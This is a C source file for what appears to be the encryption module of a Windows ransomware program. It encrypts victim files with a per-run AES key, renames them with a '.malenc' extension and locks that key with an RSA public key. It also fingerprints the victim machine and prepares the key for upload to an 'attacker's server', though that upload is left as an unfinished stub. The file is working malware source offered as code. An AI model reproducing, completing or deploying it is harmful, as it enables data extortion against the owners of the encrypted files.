#include "get_relative_path.h"

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <stdbool.h>
#include <windows.h>

#include "mbedtls/aes.h"
#include "mbedtls/ctr_drbg.h"
#include "mbedtls/entropy.h"
#include "mbedtls/pk.h"
#include "mbedtls/rsa.h"
#include "mbedtls/md.h"
#include "mbedtls/base64.h"

/* AES-128 */
#define KEY_SIZE    16 
#define IV_SIZE     16
#define BUFFER_SIZE 4096

/* Global variables for AES key */

static unsigned char aes_key[KEY_SIZE];
static bool key_loaded = false;

/* Global variables for mbedtls crypto */

static mbedtls_entropy_context entropy;
static mbedtls_ctr_drbg_context ctr_drbg;
static bool rng_initialized = false;

/* Error handling */
static void handle_error(const char *msg)
{
    fprintf(stderr, "Error: %s\n", msg);
    exit(EXIT_FAILURE);
}

/* Initialize the mbedtls state */
static void rng_init(void)
{
    const char *pers = "aes_file_encryptor";

    if (rng_initialized)
        return;

    mbedtls_entropy_init(&entropy);
    mbedtls_ctr_drbg_init(&ctr_drbg);

    if (mbedtls_ctr_drbg_seed(
            &ctr_drbg,
            mbedtls_entropy_func,
            &entropy,
            (const unsigned char *)pers,
            strlen(pers)) != 0)
    {
        handle_error("RNG initialization failed");
    }

    rng_initialized = true;
}

/* Write random bytes for key and IVs */
static void random_bytes(unsigned char *buf, size_t len) {
    rng_init();
    if (mbedtls_ctr_drbg_random(&ctr_drbg, buf, len) != 0)
        handle_error("Random generation failed");
}

/* Generate victim ID using computer name and volume serial number */
static int generate_victim_id(char *victim_id, size_t id_size) {
    char comp_name[256];
    DWORD name_len = sizeof(comp_name);
    DWORD serial_num = 0;
    
    // check if buffer is big enough
    if (!victim_id || id_size < 64) {
        fprintf(stderr, "Buffer too small\n");
        return -1;
    }
    
    // get computer name
    if (!GetComputerNameA(comp_name, &name_len)) {
        // if it fails use "PC" as default
        strcpy(comp_name, "PC");
    }
    
    // get the C drive serial number
    if (!GetVolumeInformationA("C:\\", NULL, 0, &serial_num, NULL, NULL, NULL, 0)) {
        fprintf(stderr, "Could not get drive serial number");
        return -1;
    }
    
    // combine them "comp_name-hex_serial_num"
    snprintf(victim_id, id_size, "%s-%08lX", comp_name, serial_num);
    
    return 0;
}

/* Read the encrypted key file */
static int read_encrypted_key_file(const char *key_file, 
                                    unsigned char **key_data, 
                                    size_t *key_size) {
    long file_size = 0;

    if (!key_file || !key_data || !key_size) {
        fprintf(stderr, "Invalid parameters\n");
        return -1;
    }
    
    // open file
    FILE *file = fopen(key_file, "rb");
    if (!file) {
        fprintf(stderr, "Failed to open file\n");
        return -1;
    }
    
    // get file size
    fseek(file, 0, SEEK_END);
    file_size = ftell(file);
    
    if (file_size == 0) {
        fclose(file);
        fprintf(stderr, "File is empty\n");
        return -1;
    }
    
    // allocate memory
    unsigned char *file_data = malloc(file_size);
    
    // read file
    fseek(file, 0, SEEK_SET); // go back to beginning as previously the pointer was moved
    if (fread(file_data, 1, file_size, file) != file_size) {
        free(file_data);
        fclose(file);
        fprintf(stderr, "Failed to read file\n");
        return -1;
    }
    
    fclose(file);
    
    // return key and its size
    *key_data = file_data;
    *key_size = file_size;
    
    return 0;
}

/* Convert binary data to base64 as we will send key to the attacker's server in a JSON */
static int base64_encode(const unsigned char *bin_input, 
                             size_t bin_input_len,
                             char **base64_output, 
                             size_t *base64_output_len) {
    size_t written = 0;
    
    if (!bin_input || !base64_output || !base64_output_len || bin_input_len == 0) {
        fprintf(stderr, "Invalid parameters\n");
        return -1;  
    }
    
    // calculate buffer size needed - mbedtls call with dst buffer = NULL and its len = 0
    size_t buffer_size = 0;
    mbedtls_base64_encode(NULL, 0, &buffer_size, bin_input, bin_input_len);
    
    // allocate buffer
    unsigned char *buffer = malloc(buffer_size);
    
    // encode to base64 using mbedtls
    if (mbedtls_base64_encode(buffer, buffer_size, &written, bin_input, bin_input_len) != 0) {
        free(buffer);
        fprintf(stderr, "Failed to encode to base64\n");
        return -1;
    }

    buffer[written] = '\0';

    // return string in base64 and its len
    *base64_output = (char *)buffer;
    *base64_output_len = written;
    
    return 0;
}

/* Send encrypted key to attacker's server */
static int send_key_to_attacker(const char *key_file) {

    // generate victim ID
    char victim_id[64];
    if (generate_victim_id(victim_id, sizeof(victim_id)) != 0) {
        return -1;
    }

    // read encrypted key from file
    unsigned char *key_data = NULL;
    size_t key_size = 0;
    if (read_encrypted_key_file(key_file, &key_data, &key_size) != 0) {
        return -1;
    }

    // encode key to base64
    char *base64_key = NULL;
    size_t base64_len = 0;
    if (base64_encode(key_data, key_size, &base64_key, &base64_len) != 0) {
        free(key_data); // free key data if encoding fails
        return -1;
    }

    // TODO send key to attacker's server through api request

    // cleanup
    free(key_data);
    free(base64_key);

    return 0; // TODO change to return result of sending key to attacker's server when implemented
}

/* Encrypt AES key with public RSA key */
static void save_encrypted_key_rsa(const unsigned char *key, size_t key_len, const char *pubkey_file, const char *out_file) {
    mbedtls_pk_context pk;
    mbedtls_pk_init(&pk);

    if (mbedtls_pk_parse_public_keyfile(&pk, pubkey_file) != 0)
        handle_error("Failed to load RSA public key");

    if (!mbedtls_pk_can_do(&pk, MBEDTLS_PK_RSA))
        handle_error("Public key is not RSA");

    mbedtls_rsa_context *rsa = mbedtls_pk_rsa(pk);

    // Set PKCS#1 v1.5 padding
    if (mbedtls_rsa_set_padding(rsa, MBEDTLS_RSA_PKCS_V15, 0) != 0)
        handle_error("Failed to set RSA PKCS#1 v1.5 padding");

    size_t rsa_len = mbedtls_pk_get_len(&pk);
    unsigned char *cipher = malloc(rsa_len);
    if (!cipher)
        handle_error("malloc failed");

    // PKCS#1 v1.5 encryption
    if (mbedtls_rsa_pkcs1_encrypt(
        rsa,
        mbedtls_ctr_drbg_random,  // RNG function
        &ctr_drbg,                
        key_len,                  // length of AES key
        key,                      // input buffer
        cipher                    // output buffer
    ) != 0) {
        free(cipher);
        handle_error("RSA PKCS#1 encryption failed");
    }

    /* Write encrypted key to file */
    FILE *f = fopen(out_file, "wb");
    if (!f) {
        free(cipher);
        handle_error("Cannot open AES key output file");
    }

    if (fwrite(cipher, 1, rsa_len, f) != rsa_len) {
        fclose(f);
        free(cipher);
        handle_error("Failed to write encrypted AES key");
    }

    /* Cleanup */
    fclose(f);
    free(cipher);
    mbedtls_pk_free(&pk);
}

/* Initialize AES key for the whole session */
static int ensure_aes_key_loaded(void)
{
    if (key_loaded)
        return 0;

    // Get public key path and aes path
    char public_rsa[MAX_PATH];
    if (get_relative_path(public_rsa, sizeof(public_rsa), "public_key.pem") != 0) {
        return 1;
    }

    char aes[MAX_PATH];
    if (get_relative_path(aes, sizeof(aes), "aes_key.bin") != 0) {
        return 1;
    }

    rng_init();

    /* Always generate a new key once per run */
    random_bytes(aes_key, KEY_SIZE);

    save_encrypted_key_rsa(aes_key, KEY_SIZE, public_rsa, aes);

    key_loaded = true;
    return 0;
}

/* Encrypt one file */
void encrypt_file_aes_ctr(const char *source, const char *target, const unsigned char *key) {
    /* Open files */
    FILE *in = fopen(source, "rb");
    if (!in)
        handle_error("Cannot open input file");

    FILE *out = fopen(target, "wb");
    if (!out)
        handle_error("Cannot open output file");

    /* Variables for keys and stream */
    unsigned char iv[IV_SIZE];
    unsigned char nonce_counter[IV_SIZE];
    unsigned char stream_block[16] = {0};
    size_t nc_off = 0;

    /* Setup IV */
    random_bytes(iv, IV_SIZE);
    memcpy(nonce_counter, iv, IV_SIZE);

    /* Write IV at start of file */
    if (fwrite(iv, 1, IV_SIZE, out) != IV_SIZE)
        handle_error("Failed to write IV");

    /* Setup mbedtls AES contex */
    mbedtls_aes_context aes;
    mbedtls_aes_init(&aes);

    if (mbedtls_aes_setkey_enc(&aes, key, 128) != 0)
        handle_error("AES key setup failed");

    /* ENCRYPTION */
    unsigned char buffer[BUFFER_SIZE];
    size_t n;

    while ((n = fread(buffer, 1, BUFFER_SIZE, in)) > 0)
    {
        if (mbedtls_aes_crypt_ctr(&aes, n, &nc_off, nonce_counter, stream_block, buffer, buffer) != 0)
        {
            handle_error("AES-CTR encryption failed");
        }

        if (fwrite(buffer, 1, n, out) != n)
            handle_error("Failed to write encrypted data");
    }

    /* Cleanup */
    mbedtls_aes_free(&aes);
    fclose(in);
    fclose(out);
}

int make_enc_path(const char *input, char *output, size_t output_size)
{
    if (!input || !output)
        return 1;

    size_t len = strlen(input);

    if (len + 8 > output_size) { /* +7 for ".malenc", +1 for '\0' */
        return 1;
    }

    memcpy(output, input, len);
    strcpy(output + len, ".malenc"); // safer, copies null terminator

    return 0;
}

/* Public API for cleaning the critical memory - plaintext AES key and mbedtls state variables */
void crypto_cleanup(void)
{
    memset(aes_key, 0, sizeof(aes_key));
    mbedtls_ctr_drbg_free(&ctr_drbg);
    mbedtls_entropy_free(&entropy);
    rng_initialized = false;
    key_loaded = false;
}

/* Public API for encryption */
int attack_crypto(const char *input_file)
{
    char output_file[MAX_PATH];

    ensure_aes_key_loaded();

    if (make_enc_path(input_file, output_file, sizeof(output_file)) != 0) {
        return 1;
    }

    encrypt_file_aes_ctr(input_file, output_file, aes_key);
    return 0;
}
